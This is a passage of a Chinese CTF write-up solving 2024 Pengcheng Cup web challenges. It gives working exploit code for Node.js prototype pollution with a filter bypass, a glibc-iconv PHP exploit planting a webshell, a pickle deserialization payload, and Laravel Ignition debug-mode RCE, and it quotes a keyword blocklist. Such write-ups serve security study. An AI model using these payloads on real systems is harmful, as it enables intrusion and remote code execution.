class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Hacker denied!&quot;</span>)    &#125;&#125;);app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    <span class="hljs-title function_">authenticateToken</span>(req, res, <span class="hljs-function">() =&gt;</span> &#123;        backcode = <span class="hljs-built_in">eval</span>(tmp_user.<span class="hljs-property">code</span>)        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;something happend~&quot;</span>)    &#125;);&#125;);app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> &#123;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Server running at http://localhost:<span class="hljs-subst">$&#123;port&#125;</span>`</span>);&#125;);</code></pre></div><p>原型链污染，思路就是污染secret_key伪造签名，还有想要执行的代码</p><p>但是code有检查</p><div class="code-wrapper"><pre><code class="hljs coq">var check = function (str) &#123;    <span class="hljs-keyword">let</span> input = /const|<span class="hljs-type">var</span>|<span class="hljs-type">let</span>|<span class="hljs-type">return</span>|<span class="hljs-type">subprocess</span>|<span class="hljs-type">Array</span>|<span class="hljs-type">constructor</span>|<span class="hljs-type">load</span>|<span class="hljs-type">push</span>|<span class="hljs-type">mainModule</span>|<span class="hljs-type">from</span>|<span class="hljs-type">buffer</span>|<span class="hljs-type">process</span>|<span class="hljs-type">child_process</span>|<span class="hljs-type">main</span>|<span class="hljs-type">require</span>|<span class="hljs-type">exec</span>|<span class="hljs-type">this</span>|<span class="hljs-type">eval</span>|<span class="hljs-type">while</span>|<span class="hljs-type">for</span>|<span class="hljs-type">function</span>|<span class="hljs-type">hex</span>|<span class="hljs-type">char</span>|<span class="hljs-type">base</span>|<span class="hljs-type">&quot;|&#x27;|\\|\[|\+|\*/ig</span>;        <span class="hljs-keyword">if</span> (typeof str === &#x27;object&#x27; &amp;&amp; str !== null) &#123;        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-built_in">in</span> str) &#123;            <span class="hljs-keyword">if</span> (!check(key)) &#123;                <span class="hljs-keyword">return</span> false;            &#125;            <span class="hljs-keyword">if</span> (!check(str[key])) &#123;                <span class="hljs-keyword">return</span> false;            &#125;        &#125;        <span class="hljs-keyword">return</span> true;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">return</span> !input.test(str);    &#125;&#125;;</code></pre></div><p>unknown大佬使用url解码绕过</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><div class="code-wrapper"><pre><code class="hljs Python">const jwt = require(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);function fullUrlEncode(<span class="hljs-built_in">str</span>) &#123;    <span class="hljs-keyword">return</span> Array.<span class="hljs-keyword">from</span>(<span class="hljs-built_in">str</span>).<span class="hljs-built_in">map</span>(char =&gt; <span class="hljs-string">&#x27;%&#x27;</span> + char.charCodeAt(<span class="hljs-number">0</span>).toString(<span class="hljs-number">16</span>).padStart(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;0&#x27;</span>)).join(<span class="hljs-string">&#x27;&#x27;</span>);&#125;console.log(jwt.sign(&#123; username: <span class="hljs-string">&#x27;123&#x27;</span> &#125;,<span class="hljs-string">&#x27;1111111111111111&#x27;</span>))code = `<span class="hljs-keyword">global</span>.process.mainModule.require(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;cp /flag &gt; ./public/flag&quot;</span>)`exp =<span class="hljs-string">&#x27;Reflect.get(global,`$&#123;`ev`&#125;al`)(decodeURIComponent(`&#x27;</span> + fullUrlEncode(code) +<span class="hljs-string">&#x27;`))&#x27;</span>console.log(exp)</code></pre></div><p>在<code>/login</code>使用post进行污染</p><p><img src="/../images/2024-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/image-20241111025137795.png" alt="image-20241111025137795"></p><p>GET访问<code>/</code></p><p><code>Authorization</code>请求头带着生成的jwt</p><p><img src="/../images/2024-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/image-20241111025353115.png" alt="image-20241111025353115"></p><p><img src="/../images/2024-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/image-20241111025402944.png" alt="image-20241111025402944"></p><h2 id="Lookup"><a href="#Lookup" class="headerlink" title="Lookup"></a>Lookup</h2><p>非预期巨简单，直接jackson二次反序列化+内存马，啥限制都没有</p><p><img src="/../images/2024-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/image-20241111025947769.png" alt="image-20241111025947769"></p><p><img src="/../images/2024-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/image-20241111025957947.png" alt="image-20241111025957947"></p><p>预期的话给了一个jndi注入的sink点，并且理应是需要高版本绕过的</p><p><img src="/../images/2024-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/image-20241111025726862.png" alt="image-20241111025726862"></p><p><img src="/../images/2024-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/image-20241111025738675.png" alt="image-20241111025738675"></p><p>挺好奇预期解的，怎么执行到这个hashcode（有可能与rome依赖有关）</p><p>环境应该是jdk8，后续打jndi打内存马就ldap反序列化应该就行了</p><h2 id="fileread"><a href="#fileread" class="headerlink" title="fileread"></a>fileread</h2><p>php反序列化，最终给的函数是<code>file_get_contents()</code></p><p>尝试读了几个文件都不存在，这里想可能就是要侧信道</p><p>实际上侧信道是通过报错来读文件，所以我的思路是错误的</p><p>这里实际是利用glibc实现RCE（与iconv有关的缓冲区溢出）</p><p><a href="https://xz.aliyun.com/t/14690">https://xz.aliyun.com/t/14690</a></p><p>unknown大佬好厉害</p><p>下载这个：<a href="https://github.com/ambionics/cnext-exploits">https://github.com/ambionics/cnext-exploits</a></p><p>把原先的函数换成这2个</p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; Response:    <span class="hljs-string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span><span class="hljs-string">    &quot;&quot;&quot;</span>    <span class="hljs-keyword">import</span> requests    <span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote    <span class="hljs-keyword">import</span> os    <span class="hljs-keyword">import</span> sys    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_b64</span>(<span class="hljs-params">s</span>):        <span class="hljs-comment"># execute php 1.php</span>        output = os.popen(<span class="hljs-string">&#x27;php 1.php &quot;&#x27;</span> +  s + <span class="hljs-string">&#x27;&quot;&#x27;</span>).read().strip()        <span class="hljs-keyword">return</span> output    b64 = get_b64(path)    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[GET]&#x27;</span>, path)    <span class="hljs-built_in">print</span>()    <span class="hljs-comment"># print(b64)</span>    r = requests.get(<span class="hljs-string">&#x27;http://192.168.18.24/?ser=&#x27;</span>+quote(b64))    <span class="hljs-keyword">return</span> r<span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:    <span class="hljs-string">&quot;&quot;&quot;Returns the contents of a remote file.</span><span class="hljs-string">    &quot;&quot;&quot;</span>    <span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode    path = <span class="hljs-string">f&quot;php://filter/convert.base64-encode/resource=<span class="hljs-subst">&#123;path&#125;</span>&quot;</span>    r = self.send(path)    text = r.text    find_text = <span class="hljs-string">&#x27;Your file:&#x27;</span>    idx = text.find(find_text) + <span class="hljs-built_in">len</span>(find_text)    text = text[idx:]    <span class="hljs-keyword">return</span> b64decode(text)</code></pre></div><p>新建一个1.php</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cls1</span></span>&#123;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls</span>;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;fileput&#x27;</span>);&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cls2</span></span>&#123;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$filename</span>;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$txt</span> = <span class="hljs-string">&#x27;&#x27;</span>;&#125;<span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cls1</span>();<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cls2</span>();<span class="hljs-variable">$b</span>-&gt;filename = <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>];<span class="hljs-variable">$obj</span>-&gt;cls = <span class="hljs-variable">$b</span>;<span class="hljs-variable">$s</span>= <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$s</span>) . <span class="hljs-string">&quot;\n&quot;</span>;</code></pre></div><p>运行：</p><blockquote><p>python3 cnext-exploit.py  <a href="http://192.168.18.24/">http://192.168.18.24/</a> “echo PD89YCRfUE9TVFswXWA7Pz4&#x3D; | base64 -d &gt; shell.php”</p></blockquote><p><img src="/../images/2024-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/17312640562978.png" alt="img"></p><h2 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h2><p>队里小东西好厉害</p><p><code>/login</code> 有路由</p><p>弱口令test&#x2F;123456</p><p>说实话挺抽象的，反正不是我爆出来的</p><p>Token: <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJ0ZXN0IiwiZXhwIjoxNzMxMTI4NzIzfQ.BjApxIEsP--b3BVjm2DWwZBpNYYM6ANFXamLgBszQVw</code></p><p><img src="/../images/2024-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/17312640562901.png" alt="img"></p><p>JWT 有签名校验</p><p><img src="/../images/2024-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/17312640562902.png" alt="img"></p><p>JWT 密钥可以直接爆破 <code>a123456</code></p><p><img src="/../images/2024-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/17312640562903.png" alt="img"></p><p><code>/ser</code> 返回 Python 代码</p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> pickle <span class="hljs-keyword">import</span> base64 <span class="hljs-keyword">def</span> <span class="hljs-title function_">hhhhackme</span>(<span class="hljs-params">pickled</span>):     data = base64.urlsafe_b64decode(pickled)     deserialized = pickle.loads(data)     <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">204</span></code></pre></div><p>请求 <code>/ser</code> POST 传入</p><div class="code-wrapper"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;pickled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;base64(your pickled code here.)&quot;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p><img src="/../images/2024-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/17312640562904.png" alt="img"></p><p>返回有个 exec_output，不知道是干嘛的（</p><p>异常会原样返回</p><p><img src="/../images/2024-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/17312640562915.png" alt="img"></p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> pickle<span class="hljs-keyword">import</span> base64<span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span>:    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>, (<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">raise Exception(open(&quot;/flag&quot;).read())</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>.strip(),))<span class="hljs-built_in">print</span>(base64.urlsafe_b64encode(pickle.dumps(Exp())))</code></pre></div><p><img src="/../images/2024-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/17312640562916.png" alt="img"></p><h2 id="Laravel"><a href="#Laravel" class="headerlink" title="Laravel"></a>Laravel</h2><p>版本8.83.27</p><p>laravel debug mode rce</p><p><a href="https://www.freebuf.com/vuls/264662.html">https://www.freebuf.com/vuls/264662.html</a></p><div class="code-wrapper"><pre><code class="hljs JSON">清log<span class="hljs-punctuation">&#123;</span>  <span class="hljs-attr">&quot;solution&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;parameters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;variableName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;username&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;viewFile&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span>产payloadphp -d <span class="hljs-string">&quot;phar.readonly=0&quot;</span> ./phpggc Laravel/RCE5 <span class="hljs-string">&quot;system(&#x27;ls /&#x27;);system(&#x27;cat /flag.txt&#x27;);&quot;</span> --phar phar -o php<span class="hljs-punctuation">:</span><span class="hljs-comment">//output | base64 -w 0 | python -c &quot;import sy</span>s;print(&#x27;&#x27;.join(<span class="hljs-punctuation">[</span>&#x27;=&#x27; + hex(ord(i))<span class="hljs-punctuation">[</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">]</span> + &#x27;=<span class="hljs-number">00</span>&#x27; for i in sys.stdin.read()<span class="hljs-punctuation">]</span>).upper())<span class="hljs-string">&quot;</span><span class="hljs-string"></span><span class="hljs-string">发AA对齐</span><span class="hljs-string">&#123;</span><span class="hljs-string">  &quot;</span>solution<span class="hljs-string">&quot;: &quot;</span>Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution<span class="hljs-string">&quot;,</span><span class="hljs-string">  &quot;</span>parameters<span class="hljs-string">&quot;: &#123;</span><span class="hljs-string">    &quot;</span>variableName<span class="hljs-string">&quot;: &quot;</span>username<span class="hljs-string">&quot;,</span><span class="hljs-string">    &quot;</span>viewFile<span class="hljs-string">&quot;: &quot;</span>AA<span class="hljs-string">&quot;</span><span class="hljs-string">  &#125;</span><span class="hljs-string">&#125;</span><span class="hljs-string">发payload，结尾加a</span><span class="hljs-string">&#123;</span><span class="hljs-string">  &quot;</span>solution<span class="hljs-string">&quot;: &quot;</span>Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution<span class="hljs-string">&quot;,</span><span class="hljs-string">  &quot;</span>parameters<span class="hljs-string">&quot;: &#123;</span><span class="hljs-string">    &quot;</span>variableName<span class="hljs-string">&quot;: &quot;</span>username<span class="hljs-string">&quot;,</span><span class="hljs-string">    &quot;</span>viewFile<span class="hljs-string">&quot;: &quot;</span>=<span class="hljs-number">50</span>=<span class="hljs-number">00</span>=<span class="hljs-number">44</span>=<span class="hljs-number">00</span>=<span class="hljs-number">39</span>=<span class="hljs-number">00</span>=<span class="hljs-number">77</span>=<span class="hljs-number">00</span>=<span class="hljs-number">61</span>=<span class="hljs-number">00</span>=<span class="hljs-number">48</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">67</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">31</span>=<span class="hljs-number">00</span>=<span class="hljs-number">39</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">55</span>=<span class="hljs-number">00</span>=<span class="hljs-number">78</span>=<span class="hljs-number">00</span>=<span class="hljs-number">55</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">50</span>=<span class="hljs-number">00</span>=<span class="hljs-number">54</span>=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">42</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">54</span>=<span class="hljs-number">00</span>=<span class="hljs-number">45</span>=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">53</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">43</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">37</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">44</span>=<span class="hljs-number">00</span>=<span class="hljs-number">38</span>=<span class="hljs-number">00</span>=<span class="hljs-number">2</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">44</span>=<span class="hljs-number">00</span>=<span class="hljs-number">51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">67</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">42</span>=<span class="hljs-number">00</span>=<span class="hljs-number">45</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">42</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">44</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">54</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">44</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">53</span>=<span class="hljs-number">00</span>=<span class="hljs-number">57</span>=<span class="hljs-number">00</span>=<span class="hljs-number">78</span>=<span class="hljs-number">00</span>=<span class="hljs-number">73</span>=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">57</span>=<span class="hljs-number">00</span>=<span class="hljs-number">31</span>=<span class="hljs-number">00</span>=<span class="hljs-number">70</span>=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">78</span>=<span class="hljs-number">00</span>=<span class="hljs-number">43</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">39</span>=<span class="hljs-number">00</span>=<span class="hljs-number">68</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">68</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">33</span>=<span class="hljs-number">00</span>=<span class="hljs-number">52</span>=<span class="hljs-number">00</span>=<span class="hljs-number">70</span>=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">55</span>=<span class="hljs-number">00</span>=<span class="hljs-number">47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">75</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">75</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">79</span>=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">59</span>=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">43</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">70</span>=<span class="hljs-number">00</span>=<span class="hljs-number">37</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">67</span>=<span class="hljs-number">00</span>=<span class="hljs-number">42</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">75</span>=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">48</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">38</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">55</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">73</span>=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">48</span>=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">74</span>=<span class="hljs-number">00</span>=<span class="hljs-number">61</span>=<span class="hljs-number">00</span>=<span class="hljs-number">57</span>=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">68</span>=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">45</span>=<span class="hljs-number">00</span>=<span class="hljs-number">52</span>=<span class="hljs-number">00</span>=<span class="hljs-number">70</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">33</span>=<span class="hljs-number">00</span>=<span class="hljs-number">42</span>=<span class="hljs-number">00</span>=<span class="hljs-number">68</span>=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">45</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">65</span>=<span class="hljs-number">00</span>=<span class="hljs-number">33</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">54</span>=<span class="hljs-number">00</span>=<span class="hljs-number">59</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">67</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">71</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">48</span>=<span class="hljs-number">00</span>=<span class="hljs-number">46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">31</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">55</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">78</span>=<span class="hljs-number">00</span>=<span class="hljs-number">32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span 